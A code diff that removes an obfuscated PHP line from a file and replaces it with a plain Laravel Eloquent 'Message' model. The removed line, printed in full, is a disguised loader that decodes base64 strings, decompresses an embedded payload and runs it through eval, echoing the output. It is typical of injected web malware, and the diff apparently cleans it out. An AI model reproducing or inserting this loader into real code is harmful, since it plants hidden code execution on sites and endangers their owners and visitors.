@@ -1,1 +1,24 @@
-<?php $_='07e867dc';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNplUlFzojAQfr9fwUNn0Jl7CFJ7Oo4PQiWiLa1ok5AXxyQWUVDmqIr8+ltBT20zs7Bsdr/9dvk0rToPs+vp6vIPMiRqtPTOQxVI/0abr0+980u7ye9qOjPae0HJJhh3u7p2vb7gdcHVZUKQYsOda1uxSpxsZPufzGilb4dTkXYPOtO0skjMs8XT40wt5FYt9M4Pis/jrWcnzSV0LyR2VnxiWXJgySltrznNi7cDGj2PU0M2PsIJzTNFjVQkDuIk7wfMXwaJU4DvCNzOFSU75eQ4oB4S5jDlzJMT7BR+4qwUbh8X08yzN6SAHkOBc0PQeAcYMev7S4WdKGAe+CQTpmNw2kSsb+w5JtmZw0oAljxaHuAWAVWxi8mjwmTHB69hxfcA+NAj6oWwpIrz9/4hGrk23A+sozD9OADjdm/NkzgD/Ejgj/B9YgnYS1jmlaYAixxZI14Pj4czfmVD04tF4scyktm3mq8Lzx81DQXzEjNg681L78ynso00YRcDUlxrLFXNX2HLAQGO8crF3BCJh+a0vXMhnzN3OxpfZsvu+l2F46M5jouXaTOCf7sXiSoIbm0J7F2utk9BI19K8zU99atwEOwTLASB3YjyKsvyXTt/1UuV38TqnUtmGazpp6f++3/6vWDPOLVbfdbrnX/X3QkC'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Message extends Model
+{
+    use HasFactory;
+
+    protected $fillable = [
+        'user_id',
+        'sender',
+        'message',
+        'gateway',
+        'status',
+    ];
+
+    public function user()
+    {
+        return $this->belongsTo(User::class);
+    }
+}
